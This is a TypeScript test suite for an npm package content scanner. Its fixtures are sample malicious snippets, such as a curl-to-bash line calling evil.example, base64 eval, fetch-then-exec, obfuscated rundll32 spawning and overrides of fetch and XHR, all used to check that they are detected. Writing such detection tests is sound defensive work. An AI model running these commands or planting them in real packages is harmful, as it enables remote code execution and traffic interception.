import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, it } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';

import {
  analyzePackageTarball,
  type PackageContentScanOptions,
} from '../src/scanner/package-content.js';
import { Severity } from '../src/scanner/types.js';
import { StaticAnalyzer } from '../src/scanner/static-rules.js';
import { makeTarball } from './helpers/package-tarball.js';

function integrity(archive: Buffer): string {
  return `sha512-${createHash('sha512').update(archive).digest('base64')}`;
}

/**
 * Keep every test hermetic: never read the real ~/.npm-safe rule config or
 * plugin directory unless a test explicitly provides its own.
 */
const ISOLATED_RULES = {
  rulesConfigPath: path.join(os.tmpdir(), 'npm-safe-tests-no-such-dir', 'rules.json'),
  rulesDir: path.join(os.tmpdir(), 'npm-safe-tests-no-such-dir', 'rules'),
} as const;

function scan(archive: Buffer, options: PackageContentScanOptions = {}) {
  return analyzePackageTarball(archive, { ...ISOLATED_RULES, ...options });
}

describe('package-content deep scanner', () => {
  it('verifies and scans a clean tarball entirely in memory', async () => {
    const archive = makeTarball([
      { path: 'package/index.js', content: 'export const answer = 42;\n' },
      { path: 'package/logo.png', content: Buffer.from([1, 2, 3]) },
    ]);
    const result = await scan(archive, { integrity: integrity(archive) });

    assert.strictEqual(result.summary.status, 'complete');
    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.filesScanned, 1);
    assert.strictEqual(result.summary.filesSkipped, 1);
    assert.deepStrictEqual(result.findings, []);
  });

  it('reports remote content piped to a shell as critical', async () => {
    const archive = makeTarball([{
      path: 'package/scripts/install.sh',
      content: '#!/bin/sh\ncurl https://evil.example/payload | bash\n',
    }]);
    const result = await scan(archive);
    const finding = result.findings.find((entry) => entry.ruleId === 'content-remote-shell');

    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.filePath, 'package/scripts/install.sh');
    assert.strictEqual(finding.lineNumber, 2);
  });

  it('detects encoded payloads combined with dynamic execution', async () => {
    const payload = 'A'.repeat(200);
    const archive = makeTarball([{
      path: 'package/index.js',
      content: `const payload = "${payload}";\neval(Buffer.from(payload, "base64").toString());\n`,
    }]);
    const result = await scan(archive);

    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-obfuscated-exec' && entry.severity === Severity.High));
  });

  it('detects a local network response flowing into a process command', async () => {
    const archive = makeTarball([{
      path: 'package/install.js',
      content: 'const { exec } = require("child_process");\nconst response = await fetch("https://example.test/tool");\nconst command = await response.text(); exec(command);\n',
    }]);
    const result = await scan(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-network-exec'));
  });

  it('refuses an archive whose bytes do not match published integrity', async () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const result = await scan(archive, { integrity: 'sha512-AAAAAAAA' });

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-integrity-mismatch' && entry.severity === Severity.Critical));
  });

  it('accepts any matching digest from the strongest SRI algorithm', async () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const valid = createHash('sha512').update(archive).digest('base64');
    const result = await scan(archive, {
      integrity: `sha512-AAAAAAAA sha512-${valid}`,
    });

    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('flags path traversal without writing archive entries to disk', async () => {
    const archive = makeTarball([{ path: '../outside.js', content: 'console.log("x")' }]);
    const result = await scan(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-path'));
  });

  it('flags an escaping PAX link target', async () => {
    const archive = makeTarball([
      { path: 'pax-header', type: 'x', content: '24 linkpath=../../outside\n' },
      { path: 'package/link', type: '2', content: '' },
    ]);
    const result = await scan(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-link'));
  });

  it('treats non-zero data after the tar terminator as an invalid archive', async () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const tar = gunzipSync(archive);
    tar[tar.length - 1] = 1;
    const result = await scan(gzipSync(tar));

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-invalid'));
  });

  it('does not mistake an ordinary RegExp exec call for child-process execution', async () => {
    const archive = makeTarball([{
      path: 'package/index.js',
      content: 'const match = /hello/.exec(input);\n',
    }]);
    const result = await scan(archive);

    assert.ok(!result.findings.some((entry) => entry.ruleId === 'content-process-exec'));
  });

  it('marks the scan partial when configured text limits are reached', async () => {
    const archive = makeTarball([{
      path: 'package/large.js',
      content: 'x'.repeat(256),
    }]);
    const result = await scan(archive, { maxFileBytes: 64 });

    assert.strictEqual(result.summary.status, 'partial');
    assert.strictEqual(result.summary.truncated, true);
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-scan-incomplete'));
  });

  it('reports native executable content once per archive', async () => {
    const archive = makeTarball([
      { path: 'package/prebuilds/a.node', content: Buffer.from([0, 1, 2]) },
      { path: 'package/prebuilds/b.node', content: Buffer.from([0, 1, 2]) },
    ]);
    const result = await scan(archive);

    assert.strictEqual(result.findings.filter((entry) => entry.ruleId === 'content-native-binary').length, 1);
  });

  it('integrates concealed native execution with metadata scoring and archive deduplication', async () => {
    const source = "require('child_'+'process')['sp'+'awn']('rund'+'ll32', ['native.dll,Entry']);";
    const result = await scan(makeTarball([
      { path: 'package/install.js', content: source },
      { path: 'package/duplicate.js', content: source },
      { path: 'package/native.dll', content: Buffer.from([0, 1]) },
    ]));
    const report = new StaticAnalyzer().analyze('', {
      name: 'native-regression', version: '1.0.0', scripts: { install: 'node install.js' },
    }, result.findings, result.summary);
    assert.equal(result.summary.status, 'complete');
    assert.equal(result.findings.filter(f => f.ruleId === 'content-concealed-native-exec').length, 1);
    assert.equal(report.score, 74);
    assert.equal(report.overallLevel, 'suspicious');
  });

  it('integrates browser interception evidence without relying on an install hook', async () => {
    const source = String.raw`
      const eth = /0x[a-fA-F0-9]{40}/g;
      const btc = /bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}/g;
      fetch = async function(input) { return new Response(await previous(input)); };
      XMLHttpRequest.prototype.send = function(body) { return savedSend.call(this, body); };
    `;
    const result = await scan(makeTarball([{ path: 'package/browser.js', content: source }]));
    const report = new StaticAnalyzer().analyze('', { name: 'browser-regression', version: '1.0.0' }, result.findings, result.summary);
    assert.ok(result.findings.some(f => f.ruleId === 'content-browser-interception'));
    assert.equal(report.score, 75);
    assert.equal(report.overallLevel, 'dangerous');
  });

  it('does not classify an ordinary function beside an encoded asset as dynamic execution', async () => {
    const source = `const asset = '${'A'.repeat(200)}'; function ordinary() { return asset; }`;
    const result = await scan(makeTarball([{ path: 'package/asset.js', content: source }]));
    assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
  });

  it('does not combine dynamic-execution examples in comments or strings with encoded assets', async () => {
    for (const example of ['// new Function() => function(){}', 'const docs = "eval(payload)";']) {
      const source = `const asset = '${'A'.repeat(200)}';\n${example}`;
      const result = await scan(makeTarball([{ path: 'package/examples.js', content: source }]));
      assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
    }
  });

  it('reports a lexical inspection budget as partial rather than silently complete', async () => {
    const source = `const encoded = '${'A'.repeat(200)}'; Function(encoded);` + '0;'.repeat(150_000);
    const result = await scan(makeTarball([{ path: 'package/dense.js', content: source }]));
    assert.equal(result.summary.status, 'partial');
    assert.match(result.summary.reason!, /token inspection/);
    assert.ok(result.findings.some(f => f.ruleId === 'content-scan-incomplete'));
  });

  it('keeps unrelated networking and process use as a capability rather than a high execution link', async () => {
    const source = `const cp=require('child_process'); fetch('/telemetry'); cp.exec('tool --version');`;
    const result = await scan(makeTarball([{ path: 'package/install.js', content: source }]));
    assert.ok(!result.findings.some(f => f.ruleId === 'content-network-exec'));
    assert.ok(result.findings.some(f => f.ruleId === 'content-process-exec' && f.severity === Severity.Medium));
  });

  it('does not skip fully escaped native-loader evidence in the lexical prefilter', async () => {
    const encoded = (value: string) => [...value].map(char => `\\x${char.charCodeAt(0).toString(16)}`).join('');
    const source = `require('${encoded('child_process')}')['${encoded('spawn')}']('${encoded('rundll32')}', ['native.dll,Entry']);`;
    const result = await scan(makeTarball([{ path: 'package/install.js', content: source }]));
    assert.ok(result.findings.some(f => f.ruleId === 'content-concealed-native-exec'));
  });

  it('does not spend the lexical budget when no lexical detector has a candidate', async () => {
    const result = await scan(makeTarball([{ path: 'package/data.js', content: '0;'.repeat(150_000) }]));
    assert.equal(result.summary.status, 'complete');
    assert.equal(result.summary.truncated, false);
  });
});

describe('package-content rule configuration', () => {
  const REMOTE_SHELL = '#!/bin/sh\ncurl https://evil.example/payload | bash\n';
  const PROCESS_EXEC = 'const { exec } = require("child_process");\nexec("tool --version");\n';

  function makeConfig(rules: Record<string, unknown>): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-safe-content-config-'));
    const file = path.join(dir, 'rules.json');
    fs.writeFileSync(file, JSON.stringify({ rules }), 'utf8');
    return file;
  }

  function fixture(): Buffer {
    return makeTarball([
      { path: 'package/scripts/install.sh', content: REMOTE_SHELL },
      { path: 'package/install.js', content: PROCESS_EXEC },
    ]);
  }

  it('drops findings of a disabled rule while keeping all other findings', async () => {
    const baseline = await scan(fixture());
    assert.ok(baseline.findings.some((f) => f.ruleId === 'content-remote-shell'));
    assert.ok(baseline.findings.some((f) => f.ruleId === 'content-process-exec'));

    const result = await scan(fixture(), {
      rulesConfigPath: makeConfig({ 'content-remote-shell': { enabled: false } }),
    });

    assert.ok(!result.findings.some((f) => f.ruleId === 'content-remote-shell'));
    assert.ok(result.findings.some((f) => f.ruleId === 'content-process-exec'
      && f.severity === Severity.Medium));
    assert.strictEqual(result.summary.status, baseline.summary.status);
    assert.deepStrictEqual(
      { ...result.summary },
      { ...baseline.summary },
    );
  });

  it('applies a severity override only to the targeted rule', async () => {
    const result = await scan(fixture(), {
      rulesConfigPath: makeConfig({ 'content-remote-shell': { severity: 'low' } }),
    });

    const overridden = result.findings.find((f) => f.ruleId === 'content-remote-shell');
    assert.ok(overridden);
    assert.strictEqual(overridden.severity, Severity.Low);
    const untouched = result.findings.find((f) => f.ruleId === 'content-process-exec');
    assert.ok(untouched);
    assert.strictEqual(untouched.severity, Severity.Medium);
  });

  it('still reports a failed scan when the failing rule is disabled', async () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const result = await scan(archive, {
      integrity: 'sha512-AAAAAAAA',
      rulesConfigPath: makeConfig({ 'content-integrity-mismatch': { enabled: false } }),
    });

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(!result.findings.some((f) => f.ruleId === 'content-integrity-mismatch'));
  });

  it('falls back to built-in defaults when the config file does not exist', async () => {
    const baseline = await scan(fixture());
    const result = await scan(fixture(), {
      rulesConfigPath: path.join(os.tmpdir(), 'npm-safe-no-such-config', 'rules.json'),
    });

    assert.deepStrictEqual(result.findings, baseline.findings);
    assert.deepStrictEqual(result.summary, baseline.summary);
  });

  it('falls back to built-in defaults when the config file is not valid JSON', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-safe-bad-config-'));
    const file = path.join(dir, 'rules.json');
    fs.writeFileSync(file, '{ not json !!', 'utf8');

    const baseline = await scan(fixture());
    const result = await scan(fixture(), { rulesConfigPath: file });

    assert.deepStrictEqual(result.findings, baseline.findings);
    assert.deepStrictEqual(result.summary, baseline.summary);
  });
});

describe('package-content plugin rules', () => {
  function makeRulesDir(files: Record<string, string>): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-safe-content-plugins-'));
    for (const [name, source] of Object.entries(files)) {
      fs.writeFileSync(path.join(dir, name), source, 'utf8');
    }
    return dir;
  }

  const CONTENT_PLUGIN = `export const rule = {
    id: 'plugin-secret-marker',
    name: 'Secret marker',
    description: 'flags a marker token in package files',
    severity: 'high',
    category: 'informational',
    enabled: true,
    appliesTo: ['content'],
    match: (content) => content.includes('MARKER')
      ? [{ ruleId: 'plugin-secret-marker', ruleName: 'Secret marker', severity: 'high',
           message: 'marker found', category: 'informational' }]
      : [],
  };`;

  it('merges plugin findings with built-in findings, deduplicated by ruleId', async () => {
    const rulesDir = makeRulesDir({ 'plugin.mjs': CONTENT_PLUGIN });
    const archive = makeTarball([
      { path: 'package/package.json', content: '{"name":"demo","version":"1.0.0"}' },
      { path: 'package/a.js', content: 'const a = "MARKER";\n' },
      { path: 'package/b.js', content: 'const b = "MARKER";\n' },
      { path: 'package/install.js', content: 'require("child_process").exec("tool");\n' },
    ]);

    const result = await scan(archive, { rulesDir });

    const pluginFindings = result.findings.filter((f) => f.ruleId === 'plugin-secret-marker');
    assert.strictEqual(pluginFindings.length, 1);
    assert.strictEqual(pluginFindings[0].filePath, 'package/a.js');
    assert.ok(result.findings.some((f) => f.ruleId === 'content-process-exec'));
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('keeps a single finding when a plugin ruleId collides with a built-in rule', async () => {
    const rulesDir = makeRulesDir({
      'plugin.mjs': `export const rule = {
        id: 'content-process-exec',
        name: 'Plugin override',
        description: 'd',
        severity: 'critical',
        category: 'informational',
        enabled: true,
        appliesTo: ['content'],
        match: () => [{ ruleId: 'content-process-exec', ruleName: 'Plugin override',
                        severity: 'critical', message: 'plugin hit', category: 'informational' }],
      };`,
    });
    const archive = makeTarball([
      { path: 'package/install.js', content: 'require("child_process").exec("tool");\n' },
    ]);

    const result = await scan(archive, { rulesDir });
    const findings = result.findings.filter((f) => f.ruleId === 'content-process-exec');
    assert.strictEqual(findings.length, 1);
    assert.strictEqual(findings[0].severity, Severity.Medium);
  });

  it('does not run plugin rules that do not declare the content target', async () => {
    const rulesDir = makeRulesDir({
      'plugin.mjs': CONTENT_PLUGIN.replace("appliesTo: ['content'],", ''),
    });
    const archive = makeTarball([{ path: 'package/a.js', content: 'MARKER\n' }]);

    const result = await scan(archive, { rulesDir });
    assert.ok(!result.findings.some((f) => f.ruleId === 'plugin-secret-marker'));
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('honors rule config for plugin rules (disable and severity override)', async () => {
    const rulesDir = makeRulesDir({ 'plugin.mjs': CONTENT_PLUGIN });
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-safe-plugin-config-'));
    const configPath = path.join(dir, 'rules.json');
    const archive = makeTarball([{ path: 'package/a.js', content: 'MARKER\n' }]);

    fs.writeFileSync(configPath, JSON.stringify({
      rules: { 'plugin-secret-marker': { enabled: false } },
    }), 'utf8');
    const disabled = await scan(archive, { rulesDir, rulesConfigPath: configPath });
    assert.ok(!disabled.findings.some((f) => f.ruleId === 'plugin-secret-marker'));

    fs.writeFileSync(configPath, JSON.stringify({
      rules: { 'plugin-secret-marker': { severity: 'low' } },
    }), 'utf8');
    const overridden = await scan(archive, { rulesDir, rulesConfigPath: configPath });
    const finding = overridden.findings.find((f) => f.ruleId === 'plugin-secret-marker');
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Low);
  });

  it('skips a plugin file that throws on import and scans with built-in rules only', async () => {
    const rulesDir = makeRulesDir({
      'broken.mjs': 'throw new Error("plugin exploded on import");\n',
      'also-broken.mjs': 'export const rule = undefined;\n',
    });
    const archive = makeTarball([
      { path: 'package/install.js', content: 'require("child_process").exec("tool");\n' },
    ]);

    const baseline = await scan(archive);
    const result = await scan(archive, { rulesDir });

    assert.deepStrictEqual(result.findings, baseline.findings);
    assert.deepStrictEqual(result.summary, baseline.summary);
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('keeps the failed status when a plugin file throws on a broken archive', async () => {
    const rulesDir = makeRulesDir({
      'broken.mjs': 'throw new Error("plugin exploded on import");\n',
    });
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const tar = gunzipSync(archive);
    tar[tar.length - 1] = 1;

    const result = await scan(gzipSync(tar), { rulesDir });

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((f) => f.ruleId === 'content-archive-invalid'));
  });
});

